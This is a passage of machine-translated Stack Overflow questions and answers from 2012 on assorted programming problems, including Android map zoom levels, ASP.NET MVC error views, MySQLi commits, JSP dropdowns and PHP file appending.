如果您只对调整 DST 的 DateTime 感兴趣，这比处理不需要的 AdjustmentRule 容易得多。

顺便说一句，GMT 已过时，取而代之的是 UTC。

# android - 如何根据地图上的圆圈绘制来查找缩放级别

> ID：11309632
> 
> 赞同：10
> 
> 时间：2012-07-03T11:07:25.667
> 
> 标签：android, google-maps

我正在地图上绘制圆并指定半径，它会成功绘制圆。但是当我使用 seekbar 更改圆圈的大小时，我需要在屏幕上踩下圆圈并缩放该级别的地图，我对此一无所知，需要您的指导，谢谢。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2014-12-26T08:16:55.570

我们还可以从绘制的圆圈中获取地图的缩放级别

```
Circle circle = googleMap.addCircle(circleOptions);

googleMap.animateCamera(CameraUpdateFactory.newLatLngZoom(
                        circleOptions.getCenter(), getZoomLevel(circle) 
```

//缩放级别的方法

```
public int getZoomLevel(Circle circle) {
    int zoomLevel = 11;
    if (circle != null) {
        double radius = circle.getRadius() + circle.getRadius() / 2;
        double scale = radius / 500;
        zoomLevel = (int) (16 - Math.log(scale) / Math.log(2));
    }
    return zoomLevel;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-07-15T13:58:26.940

构建.gradle：

```
dependencies {
    compile 'com.google.maps.android:android-maps-utils:0.4+'
}

public static LatLngBounds getLatLngBoundsFromCircle(Circle circle){
    if(circle != null){
        return new LatLngBounds.Builder()
                .include(SphericalUtil.computeOffset(circle.getCenter(), circle.getRadius() * Math.sqrt(2), 45))
                .include(SphericalUtil.computeOffset(circle.getCenter(), circle.getRadius() * Math.sqrt(2), 225))
                .build();
    }
    return null;
}

map.animateCamera( CameraUpdateFactory
    .newLatLngBounds(MapUtils.getLatLngBoundsFromCircle(mapCircle),20) ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-03T11:32:02.980

很长一段时间后，我从某个地方找到了解决方案。

这是给我最小纬度/经度和最大纬度/经度的方法。基于此，我得到了 latspan 和 longspan。

```
public void boundingCoordinates(double distance, double radius) {

    if (radius < 0d || distance < 0d)
        throw new IllegalArgumentException();

    // angular distance in radians on a great circle
    double radDist = distance / radius;

    double radLat = Math.toRadians(gp.getLatitudeE6()/1e6); // here is your single point latitude gp.getLatitude
    double radLon = Math.toRadians(gp.getLongitudeE6()/1e6); // here is your single point longitude gp.getlongitude

    double minLat = radLat - radDist;
    double maxLat = radLat + radDist;

    double minLon, maxLon;
    if (minLat > MIN_LAT && maxLat < MAX_LAT) {
        double deltaLon = Math.asin(Math.sin(radDist) /Math.cos(radLat));
        minLon = radLon - deltaLon;

        if (minLon < MIN_LON) 
            minLon += 2d * Math.PI;

        maxLon = radLon + deltaLon;

        if (maxLon > MAX_LON) 
            maxLon -= 2d * Math.PI;
    } else {
        // a pole is within the distance
        minLat = Math.max(minLat, MIN_LAT);
        maxLat = Math.min(maxLat, MAX_LAT);
        minLon = MIN_LON;
        maxLon = MAX_LON;
    }

    minLat = Math.toDegrees(minLat);
    minLon = Math.toDegrees(minLon);
    maxLat = Math.toDegrees(maxLat);
    maxLon = Math.toDegrees(maxLon);

    minGeo = new GeoPoint((int)(minLat*1e6),(int)(minLon*1e6));
    maxGeo = new GeoPoint((int)(maxLat*1e6),(int)(maxLon*1e6));
} 
```

现在你通过任何单位的距离，例如你必须通过地球的半径，例如如果你通过，`2 km`那么地球的半径就是公里`6370.997`。

你可以试试，很酷的东西

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-26T02:23:50.577

在我的代码中，我在具有动态半径的标记周围添加了一个透明圆圈，并缩放地图相机以使其适合屏幕。

它在我的项目中 100% 正常工作。

```
@Override
public void onMapReady(GoogleMap googleMap) {
    mMap = googleMap;
    mMap.setOnMarkerClickListener(this);

    MapsInitializer.initialize(Objects.requireNonNull(getContext()));

    // Add a marker on Property location
    LatLng propertyLatlng = new LatLng(getLatitude(), getLongitude());

    //  draw transparent blue circle around marker
    try {
        CircleOptions circleOptions = new CircleOptions()
                .center(propertyLatlng)
                .radius(Double.parseDouble(radius) / 0.00062137)
                .strokeColor(BLUE_TRANSPARENT)
                .strokeWidth(0)
                .fillColor(BLUE_TRANSPARENT);
        Circle circle = mMap.addCircle(circleOptions);
        googleMap.moveCamera(CameraUpdateFactory.newLatLngZoom(
                circleOptions.getCenter(), getZoomLevel(circle)));
    } catch (Exception e) {
        AppLogger.logError(TAG, e.getMessage());
    }

}

/**
 * @param circle : circle
 * @return : return zoom level according to circle radius
 */
public float getZoomLevel(Circle circle) {
    int zoomLevel = 11;
    if (circle != null) {
        double radius = circle.getRadius() + circle.getRadius() / 2;
        double scale = radius / 500;
        zoomLevel = (int) (16 - Math.log(scale) / Math.log(2));
    }
    return zoomLevel+.4f;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-07-03T12:30:31.617

```
 double getZoomLevel() {
    double zoomLevel = 0.0;
    double newRadius = radiusOfCircle + radiusOfCircle / 2;
    double scale = newRadius / 500;
    zoomLevel = (6 - log(scale) / log(2));
    return zoomLevel;
  } 
```

这对我有用

感谢@Anand Tiwari

# c# - 为什么 ASP.NET MVC 3 异常被“处理”两次？

> ID：11309635
> 
> 赞同：3
> 
> 时间：2012-07-03T11:07:33.357
> 
> 标签：c#, asp.net-mvc-3, exception-handling

我已经使用下面的代码实现了异常处理。[编辑开始]我不知道为什么它会调用两次视图。[编辑完成]

基本控制器

```
public class BaseController : Controller
    {
        protected override void OnException(ExceptionContext filterContext)
        {
            if (filterContext.HttpContext.IsCustomErrorEnabled)
            {
                filterContext.ExceptionHandled = true;

                if (filterContext.Exception.GetType() == typeof(ArgumentOutOfRangeException))
                {
                    this.View("OutOfRange").ExecuteResult(this.ControllerContext);
                }
                else
                {
                    this.View("Error").ExecuteResult(this.ControllerContext);
                }
            }

            base.OnException(filterContext);
        }
    } 
```

家庭控制器

```
public class HomeController : BaseController
{
        public ActionResult Exception2()
        {
            throw (new ArgumentOutOfRangeException());
        }

        public ActionResult Exception3()
        {
            throw (new Exception());
        }
} 
```

错误视图（仅限共享文件夹）

```
@model System.Web.Mvc.HandleErrorInfo
@{
    Layout = null;
}
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
</head>
<body>
    <h2>
        Sorry, an error occurred while processing your request.
    </h2>
    <h3>
        @if (Model != null)
        {
            <p>@Model.Exception.GetType().Name<br />
                thrown in @Model.ControllerName @Model.ActionName</p>
            <br />
            @Model.Exception
        }
    </h3>
</body>
</html> 
```

OutOfRange 视图（仅限共享文件夹）

```
@{
    Layout = null;
}
<!DOCTYPE html>
<html>
<head>
    <title>OutOfRange Exception</title>
</head>
<body>
    <div>
        <h3>
            @if (Model != null)
            {
                <p>@Model.Exception.GetType().Name<br />
                    thrown in @Model.ControllerName @Model.ActionName</p>
                <br />
                @Model.Exception
            }
        </h3>
    </div>
</body>
</html> 
```

执行网址：`http://[domainName]/Home/Exception2`

在这里它工作正常。[编辑：这里它也调用了两次。]

![在此处输入图像描述](../Images/58807dd139f5bd0f6e0b974fc4c899c0.png)

执行网址：`http://[domainName]/Home/Exception3`

**在这里它不能正常工作。您可以看到“抱歉，处理您的请求时出错”。来了两次。当我使用上面的 URL 调试应用程序时，错误视图调用了两次（第一次模型为空，第二次模型包含一些值）。我可以知道我的实施有什么问题吗？** ![在此处输入图像描述](../Images/7a772b87a6e2074eaa9e73806c8c525c.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-04T06:06:51.193

要尝试的事情：

1.  如果存在，则从您的默认`HandleError`全局操作过滤器属性中删除它。`Global.asax`当您创建新的 ASP.NET MVC 3 应用程序时，默认模板会将其注册到`RegisterGlobalFilters`方法中。所以注释掉注册这个属性的行。
2.  在 web.config 中启用自定义错误：

    ```
    <customErrors mode="On" /> 
    ```

* * *

更新：

如果您想将模型传递给`Error.cshtml`视图（因为它是强类型的`HandleErrorInfo`），您可以执行以下操作：

```
else
{
    string controllerName = filterContext.RouteData.GetRequiredString("controller");
    string actionName = filterContext.RouteData.GetRequiredString("action");
    var model = new HandleErrorInfo(filterContext.Exception, controllerName, actionName);
    var result = new ViewResult
    {
        ViewName = "Error",
        ViewData = new ViewDataDictionary<HandleErrorInfo>(model)
    };
    filterContext.Result = result;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T14:11:26.600

`base.OnException(filterContext);`之前 添加`if (filterContext.HttpContext.IsCustomErrorEnabled)`

```
 protected override void OnException(ExceptionContext filterContext)
      {
          base.OnException(filterContext);
         if (filterContext.HttpContext.IsCustomErrorEnabled)

      } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-22T15:09:04.023

我有同样的问题，但我设法通过添加来解决错误：

```
Response.End(); 
```

到我的 OnException 方法结束。

我知道这不是理想的解决方案，但是，它至少让我摆脱了束缚，直到我可以研究更完整的选择。

# visual-c++ - CATIA - 来自 .CATPart 的 CGRContainer

> ID：11309636
> 
> 赞同：0
> 
> 时间：2012-07-03T11:07:33.970
> 
> 标签：visual-c++, cad, catia, caa

我需要阅读 CGR 容器内的详细信息以获取 CATIA V5 R18 零件文件。
是否可以读取零件文件的 CGR 详细信息。

`CATCGRContainer *GetCGRContainer()`功能在`CATICGRDocument`界面下可用。

```
CATDocument *iDoc = NULL;
CATBaseUnknown *oApplCont = NULL;

HRESULT hr = CATGetApplicativecontainer(oApplCont,iDoc,IID_CATIContainer,"CGRCont"); 
```

这得到了成功，但是如果我们查询 CATICGRDocument 它会从这个 Applcnt 失败。

如何查询 CATICGRDocument 接口？

我如何使用 CATIA v5 R18 CAA 阅读这些详细信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-06T06:39:24.700

CATICGRDocument 是非公共接口。

# django - 在管理员更改列表视图中过滤外键选项

> ID：11309638
> 
> 赞同：0
> 
> 时间：2012-07-03T11:07:36.850
> 
> 标签：django, django-admin

我得到了两个通过 Django 中的 ForeignKey 相关的模型。（我正在使用 Django 1.3）

```
Class Person(models.Model):
    # some fields here like name, gender, etc...

Class Course(models.Model):
    # some fields here
    contact = models.ForeignKey(Person, blank=True, null=True) 
```

在课程的管理员更改列表视图中，我希望能够按 ForeignKey 联系人过滤课程。在 admin.py 我得到：

```
class CourseAdmin(admin.ModelAdmin):
   list_filter = ('contact',) 
```

这工作得很好。我可以按所有可用的联系人过滤课程。现在我想只显示那些实际上附加了课程的联系人。我在这里阅读了 SO 以通过创建自定义 FilterSpec 来实现 CustomFilters。我不知道这是否是正确的方向，因为我只需要进一步过滤用于显示联系人选择的查询集。

在外壳中，我通过以下方式获得所需的查询集：

```
contacts=Person.objects.filter(course__in=Course.objects.all()).distinct() 
```

我已经读到您可以在 1.4 中轻松实现这一点，但我仍然受制于 1.3 有人可以指出我正确的方向吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:27:53.243

Django 1.3 也支持过滤器，但过滤器类在 1.4 中被移动/重命名。使用 FilterSpec 是实现目标的方法。您不仅需要过滤查询集，还需要正确处理来自 QueryString 的应用过滤器。所以继续使用过滤器。这是一个非常好的片段，它处理 FK 过滤，并且有不错的选项：[http ://djangosnippets.org/snippets/2260/](http://djangosnippets.org/snippets/2260/)

# google-chrome - Chrome 和 Firefox 中不可读的希腊文本

> ID：11309641
> 
> 赞同：1
> 
> 时间：2012-07-03T11:07:41.417
> 
> 标签：google-chrome, browser, text, translation, symbols

在我的 Chrome 浏览器中，我想阅读下面的希腊文字，但它不可读。也试过火狐，它是一样的。

我怎样才能在我的浏览器中阅读这个希腊文本，或者至少将它们翻译成 Word 并能够阅读？

ŒïœÖœáŒ±œÅŒπœÉœÑŒøœçŒºŒµ。Œü ŒªŒøŒ≥Œ±œÅŒπŒ±œÉŒºœå œÉŒ±œÇ Œ≠œáŒµŒπ œÄŒπœÉœÑœâŒ∏ŒµŒØ ŒµœÄŒπœÑœÖœáœéœÇ ŒºŒµ 41.00ŒµœÖœÅœé。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:14:00.477

这不是希腊语，可能你有一个编码错误

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:38:31.303

看起来您正在尝试将 UTF-8 读取为希腊语的 8 位编码（可能是 Windows-1253）。尝试更改浏览器中的页面编码。

# vba - 使用outlook vba将outlook消息的excel附件保存在windows的指定文件夹中

> ID：11309642
> 
> 赞同：0
> 
> 时间：2012-07-03T11:07:47.333
> 
> 标签：vba, outlook

> **可能重复：**
> [如何将 Outlook 2007 收件箱中定义的子文件夹中收到的电子邮件中附加的 excel 文件保存到 Windows 上的文件夹中？](https://stackoverflow.com/questions/11293108/how-to-save-excel-file-attached-in-an-email-received-in-a-defined-sub-folder-in)

我真的需要一个 Outlook vba 功能来自动将 excel 附件保存在名为 daily 的给定收件箱子文件夹中，并且 windows 的目标文件夹具有路径 C:/daily 报告，因此我感谢您的帮助和支持。

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T16:42:27.067

`enter code here`您可以使用以下脚本并从 Outlook 的规则和警报运行它并应用于所需的用户或项目

```
Public Sub saveAttachtoDisk(itm As Outlook.MailItem)
Dim objAtt As Outlook.Attachment
Dim saveFolder As String
saveFolder = "E:\Attachments\"
    For Each objAtt In itm.Attachments
        objAtt.SaveAsFile saveFolder & "\" & objAtt.DisplayName
        Set objAtt = Nothing
    Next
End Sub 
```

谢谢，

# c++ - 包括库 C++ 的问题

> ID：11309645
> 
> 赞同：1
> 
> 时间：2012-07-03T11:07:51.707
> 
> 标签：c++, g++, static-libraries, unix-ar

我有一个非常简单的 C++ 文件`Multiplier.cpp`和相应的头文件，我使用以下命令从中创建了一个库

```
$ g++ -o Multiplier.o -c Multiplier.cpp
$ ar cr libMultiplier.a Multiplier.o 
```

在一个新目录中，我创建了一个使用该类的`Calculator.cpp`（带有相应的头文件） 。`Multiplier`头文件`Calculator.h`有对应的`#include "Multiplier.h"

头文件`Calculator.h`有对应的`#include "Multiplier.h"`

我将创建的库复制到此目录中，并尝试`Calculator.cpp`使用以下命令进行编译：

```
$ g++ -o Calculator Calculator.cpp -L. -lMultiplier 
```

这给了我这些错误：

```
In file included from Calculator.cpp:1:
Calculator.h:1:24: error: Multiplier.h: No such file or directory
In file included from Calculator.cpp:1:
Calculator.h:6: error: ISO C++ forbids declaration of ‘Multiplier’ with no type
Calculator.h:6: error: expected ‘;’ before ‘&amp;’ token
Calculator.h:8: error: expected `)' before ‘&amp;’ token
Calculator.cpp:5: error: redefinition of ‘class something::Calculator’
Calculator.h:5: error: previous definition of ‘class something::Calculator’` 
```

我已经搜索了很长时间，但无法弄清楚发生了什么。我正在使用 GCC 4.2.1。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:10:43.333

您的包含文件`Multiplier.h`位于另一个文件夹中。您希望编译器如何找到它？您需要告诉编译器文件在哪里，要么使用`-I`命令行标志并提供包含文件的路径，要么使用`#include`指令中的路径。

# php - MySQLi 不工作，没有错误，没有插入信息

> ID：11309650
> 
> 赞同：2
> 
> 时间：2012-07-03T11:08:03.593
> 
> 标签：php, mysqli

我一直在做所有人告诉我让它工作，但没有错误，也没有插入行：

任何的想法？

```
private $db;

// Constructor - open DB connection
function __construct() 
{
    $this->db = new mysqli('localhost', 'root', '', 'sampleinyoudb');
    $this->db->autocommit(FALSE);

    if (mysqli_connect_errno()) 
    {
        sendResponse(500, "Could not connect to the database!");
        exit();
    }
}

// Destructor - close DB connection
function __destruct() 
{
    $this->db->close();
} 
```

...

```
 if($stmt = $this->db->prepare("INSERT INTO Users (id,email) VALUES (?, ?)"))
        {
            $test1 = 1; //Empty
            $test2 = 'asdasd@gmail.com'; //Empty
            $stmt->bind_param("is", $test1, $test2);
            $stmt->execute();   
            if ( false===$stmt ) 
            {
              die('execute() failed: ' . htmlspecialchars($mysqli->error));
            }               
            $stmt -> close();
        }
        else
        {
            printf("Prepared Statement Error: %s\n", $this->db->error);
        }
        echo 'Any Errors: '.$this->db->error.PHP_EOL; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T11:12:04.877

您已指定[`autocommit(FALSE)`](http://www.php.net/manual/en/mysqli.autocommit.php)，但未[手动提交](http://php.net/manual/en/mysqli.commit.php)您的事务。在某些时候，`$stmt->execute()`您必须放置：

```
$this->db->commit(); 
```

# android - 使用大量包含编码 ndk main()

> ID：11309651
> 
> 赞同：0
> 
> 时间：2012-07-03T11:08:07.653
> 
> 标签：android, c++, android-ndk

我尝试了一个简单的 NDK C++（与 C 的语法完全不同！）hello world，它可以工作。

现在我想用 NDK 编译我非常大的 C++ 文件。

我需要重命名我的`main()`吗？我注意到一些使用 的帖子`android_main()`，还是应该使用标准的 package.class.method？并用优秀包围他们！它是这样工作的：

```
extern "C" {
JNIEXPORT jstring JNICALL
  Java_com_optimuse_app_OptimuseAppActivity_generate(JNIEnv* env, jobject thiz){} 
```

但是我可以将我的 main 重命名为这样的名称吗？或者我应该使用android_main。互联网上的许多帖子让我感到困惑。

另外，我不确定我需要对所有包含的内容做什么。我有一堆喜欢`<algorithm.h>`和我自己的 .h 文件。

感谢您帮助我完成约定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T08:00:49.047

好的，我让它工作了：我从 Mk 文件中省略了我的 .h 文件。我从java将它添加到main（重命名为main1）的底部：

```
extern "C" {

JNIEXPORT jstring JNICALL Java_com_example_optimuse_MainActivity_generate(JNIEnv* env, jobject thiz);
};

JNIEXPORT jstring JNICALL Java_com_example_optimuse_MainActivity_generate(JNIEnv* env, jobject thiz){

    string str = main1();
    return env->NewStringUTF(str.c_str());

} 
```

# ios - 如何共享个人 Apple iOS 开发者帐户

> ID：11309656
> 
> 赞同：0
> 
> 时间：2012-07-03T11:08:28.947
> 
> 标签：ios, code-signing, iphone-developer-program

我查看了其他 StackOverFlow 问题，但我有点困惑。我正在尝试与我信任的朋友共享一个 iOS 开发者帐户。他有自己的苹果 ID，但我们也在他的 Mac 中输入了我的苹果 ID，以确保安全。

然后我们按照教程导入 .p12 证书密钥，在 Xcode 中下载并导入配置文件 ecc 但他仍然收到“找不到有效的签名身份”消息。

我们知道这不是 100% 安全的做法，但共享此帐户对我们双方来说都是最舒适的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:45:23.843

您应该至少需要在 Keychain 中导入 2 个文件： - 开发证书 - 分发证书 另外，不确定，但它可能会有所帮助： - 您提交给苹果的原始自签名证书（CSR）

证书需要从最初签署 CSR 并导入第二台计算机的钥匙串的计算机生成。此外，请务必在登录钥匙串中导入证书。

附言。在导入证书之前关闭 XCode - 或在导入后关闭/重新启动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-22T16:22:47.057

另一种非常简单的方法，我可以确认工作（如果您不想将“人 A”的苹果 id 密码提供给另一个“人 B”）：

*   将“人员 B”的 Mac 屏幕共享给“人员 A”（具有开发者帐户的 Apple id 登录凭据的人），例如。通过 Mac 上的消息应用程序

*   允许“人 A”远程控制“人 B”的 Mac 屏幕

*   让“人员 B”直接在 XCODE（设置>>帐户）中输入与开发人员帐户关联的苹果 ID 的登录凭据。

*   在“人 A”的 Mac 上：导出他/她的 apple id 帐户信息（设置 >> 帐户 >> 齿轮图标）并将文件发送给“人 B”。

    *   在“人员 B”的 Mac 上：尝试在连接的设备上运行构建后提示导入文件（“人员 A”可能必须再次输入密码）。

步骤也可能以不同的顺序工作（例如，首先导入配置文件），但我没有对此进行测试。

# python - Python：OSC.py 没有注册回调来处理 OSC 地址

> ID：11309660
> 
> 赞同：0
> 
> 时间：2012-07-03T11:08:53.540
> 
> 标签：python, osc, max-msp-jitter

我希望有一个人可以帮助我！发送 OSC 消息时出现此错误：

```
OSCServer: No callback registered to handle OSC-address '/minibee/output/1' 
```

我似乎已经成功运行了 OSC 服务器，但它不会发送任何数据，并抱怨它正在接收的数据......

```
Created OSC listener at (0.0.0.0,57600) and OSC sender to (127.0.0.1,57120) and opened serial port at /dev/tty.usbserial-A800f7Tb. Now waiting for messages. 
```

我检查了脚本是否需要这种格式：

它监听的 OSC 消息：

/minibee/output - iii..i - id，以及与输出一样多的 8 位整数（首先是 PWM，然后是数字）

/minibee/custom - iii..i - id，以及自定义消息所需的 8 位整数

它发送的 OSC 消息：

/minibee/info - siii - 序列号、id、输入数量、输出数量

/minibee/data - iff..f - id，以及与输入一样多的浮点数

有没有人熟悉这个并能够帮助我解决问题？我正在使用 Max/MSP 发送和接收 OSC 消息，但我认为我的问题与 Max 无关。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T12:55:57.887

如果我理解正确，注册的回调

```
"/minibee/output" 
```

不会为路径为的 OSC 消息调用

```
"/minibee/output/1" 
```

或“/minibee/output/anything_really”

所以你的处理程序需要注册“/minibee/output”，然后你得到回调参数中的整数。

# java - 刷新页面后如何保持下拉列表值相同

> ID：11309662
> 
> 赞同：4
> 
> 时间：2012-07-03T11:09:06.547
> 
> 标签：java, database, jsp, servlets

我有一个下拉列表

```
<select name="cate">
  <option value="h">India</option>
  <option value="m">USA</option>
  <option value="c">England</option>
</select>
<input type="submit" value="show"> 
```

单击显示按钮时，在下表中将显示所选国家/地区的详细信息。详细信息来自数据库，每次点击页面都会刷新。

我的问题是，如果用户在下拉列表中选择英格兰并单击显示按钮，它将显示详细信息，但下拉列表将仅显示名字。我想显示选定的值名称。

请帮我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T12:13:37.157

```
<input type="hidden" name="selectedValue" value="0"/> 
```

把上面的放在你的选择标签的正下方

并在您的 servlet 中执行此操作

```
String selectedValue = `request.getParameter("selectedValue")` 
```

现在将 selectedValue 设置到 servlet 请求中

在你的最终 jsp 中创建一个 JS 函数

```
function selectedValue(){  

    var value =<%=request.getParameter("selectedValue")%>;  
    if(value !=null)  
        {

        document.f1.slvalue.selectedIndex=value ;          

        }    

} 
```

在最终 jsp 页面的 bodyload 上调用 selectedValue() 函数。 **“slvalue”**是您选择标签的名称

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T11:24:41.313

代码

```
<input type=hidden id ="selection" name="selection" value="">
<select name="cate">
  <option onclick="document.getElementById('selection').value='h';" value="h">India</option>
  <option onclick="document.getElementById('selection').value='m';" value="m">USA</option>
  <option onclick="document.getElementById('selection').value='c';" value="c">England</option>
</select> 
```

JSP 代码

```
<%
  String selected = request.getParameter("selection");
%> 
```

现在，当您在 JSP 页面上时，您可以看到用户选择的内容。渲染元素时，将**select**属性附加到所选选项

eg：<option value="h" selected> 印度</option>

**更新** 在显示下拉列表的地方，您必须进行某种验证，您需要检查**选择**值和实际打印的内容。

```
if(selected ==null || selected.equals('')){
    //do regular printing of the dropdown as you do now
}else{
  out.print("<select>");
  while(rs.next()){
    if(rs.getString("VALUE").equals(selected )){
        out.print("<option value=\""+rs.getString("VALUE")+"\" SELECTED >"+rs.getString("COUNTRY")+"</option>");
    }else{
        out.print("<option value=\""+rs.getString("VALUE")+"\" >"+rs.getString("COUNTRY")+"</option>");
    }
  }
  out.print("</select>");
} 
```

PS：代码是即时编写的，可能需要一些异常处理或可能存在一些拼写错误

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:15:06.257

您可以添加`selected`到`<option>`标签，使其成为页面最初选择的值。

```
<option value="h" selected>India</option> 
```

将在页面加载时选择印度选项。

您需要向 JSP 添加一些逻辑，以根据提交页面时选择的值添加`selected`到正确的标记中。`<option>`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T11:21:40.147

对于干净的方法，您可以设置 cookie。

看看这个jquery方法：[jQuery cookies setting select drop down value after page refresh](https://stackoverflow.com/questions/2358689/jquery-cookies-setting-select-drop-down-value-after-page-refresh)

# android - 如何像消息屏幕一样显示计数？

> ID：11309667
> 
> 赞同：2
> 
> 时间：2012-07-03T11:09:15.793
> 
> 标签：android

嗨，我想在我们在发送按钮下方键入消息时显示消息的剩余字符数，就像在消息传递屏幕中一样。我正在使用下面的 xml 代码。如果有人知道，请帮助我：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#ffffff"
    android:orientation="vertical" >

    <EditText
        android:id="@+id/txtTO"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="top"
        android:hint="To" />
         <requestFocus />
    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:background="@android:color/darker_gray"
        android:padding="5dp" >

        <EditText
            android:id="@+id/txtMessage"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:ems="10"
            android:hint="Type the message" >

        </EditText>

        <Button
            android:id="@+id/btnSend"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Send" />

        <TextView
                android:id="@+id/tvCount"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"                                
                android:visibility="gone"/>
    </LinearLayout>

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:13:57.693

使用`Textwatcher`. 检查以下链接：

[http://developer.android.com/reference/android/text/TextWatcher.html](http://developer.android.com/reference/android/text/TextWatcher.html)

该`onTextChanged()`方法可用于监视消息中剩余的字符数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:15:21.653

检查源代码，...

```
emailBody = (EditText) findViewById(R.id.editTxtBody);
        emailBody.addTextChangedListener(new TextWatcher() {

            public void onTextChanged(CharSequence s, int start, int before,
                    int count) {
                count = 256 - emailBody.length();
                textCount.setText(Integer.toString(count));
                textCount.setTextColor(Color.GREEN);
                if (count < 10)
                    textCount.setTextColor(Color.YELLOW);
                if (count < 0) {
                     InputFilter.LengthFilter lengthFilter;
                     lengthFilter = new InputFilter.LengthFilter(emailBody);
                    etMessage.setFilters(new InputFilter[] { lengthFilter });
                }

            }

            public void beforeTextChanged(CharSequence s, int start, int count,
                    int after) {

            }

            public void afterTextChanged(Editable s) {

            }
        }); 
```

谢谢..

# php - 如何在不同的会话中追加新条目

> ID：11309668
> 
> 赞同：0
> 
> 时间：2012-07-03T11:09:17.607
> 
> 标签：php

我正在尝试的问题是关于这段代码：

```
<?php

    session_start();
    /* ... */

    if(!array_key_exists('entries', $_SESSION) || array_key_exists('reset', $_GET))
    {
        $_SESSION['entries'] = array();
    }

    $_SESSION['entries'][] = array("name" => $_GET["name"]);

    // json
    $json_string = json_encode($_SESSION['entries']);

    //file
    $newfile="location.json";
    $file = fopen ($newfile, "w");
    fwrite($file, $json_string);
    fclose ($file);
    ?> 
```

该脚本获取 te POST 变量，将它们编码为 json 格式并保存到文件中，将新条目附加到文件中。它运作良好，但是当我开始一个新会话时，文件被覆盖，并从空重新开始。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:13:19.900

改变模式

```
 $file = fopen ($newfile, "a"); 
```

> **'a'** 只供书写；将文件指针放在文件末尾。如果该文件不存在，请尝试创建它。

[`Reference`](http://php.net/manual/en/function.fopen.php)

### 选择 ：

[`file_put_contents`](http://in.php.net/manual/en/function.file-put-contents.php) 与**FILE_APPEND** AND **LOCK_EX**标志一起使用

> 该函数等同于依次调用 fopen()、fwrite() 和 fclose() 将数据写入文件。

```
// using the FILE_APPEND flag to append the content to the end of the file
// and the LOCK_EX flag to prevent anyone else writing to the file at same time
file_put_contents($file, FILE_APPEND | LOCK_EX); 
```

# php - php数字数组

> ID：11309672
> 
> 赞同：2
> 
> 时间：2012-07-03T11:09:33.220
> 
> 标签：php

我是 PHP 初学者，我想做以下事情：

我想将一组数字与 itemid 进行比较。目前，我的代码仅在我声明要检查的数组的哪个位置（productId）时才有效。如何检查 productId 以测试数组的全部内容？

```
$productId = array(146,147,148,149,150,151,152,153,154,155,158,159,160,161,162,
                   163,113,116,117,118,114,119,120,121,115,121,122,123,124);

if(($_REQUEST['view'] == 'article') && ( $_REQUEST['Itemid'] == $productId[0])) {
    $setCol = 1;
    $setId = "main-noleft"; 
} else {
    $setCol = null;
    $setId = "main";
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:11:45.890

```
in_array($_REQUEST['Itemid'], $productId) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:11:37.590

使用`in_array`函数： http: [//php.net/in_array](http://php.net/in_array)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:18:33.483

```
you can also use this
array_search( $_REQUEST['Itemid'], $productId ) 
```

array_search 在数组中搜索给定的值，如果成功则返回相应的键
[array_search](http://php.net/manual/en/function.array-search.php)

# c# - 可以传递给 Environment.Exit 方法的默认值是什么？

> ID：11309675
> 
> 赞同：19
> 
> 时间：2012-07-03T11:09:38.210
> 
> 标签：c#, .net, console-application

可以传递给`Environment.Exit`方法的默认值是什么，每个代码的含义是什么？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-07-03T11:12:23.613

0 表示成功，其他任何值表示错误。没有标准。

一些程序试图满足约定。这是微软的约定。[http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:13:38.313

传递的值是退出代码。按照惯例，0 表示成功，其他任何值都表示错误。为不同的错误代码赋予语义意义几乎取决于您。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:13:29.173

退出代码没有预定义的含义。

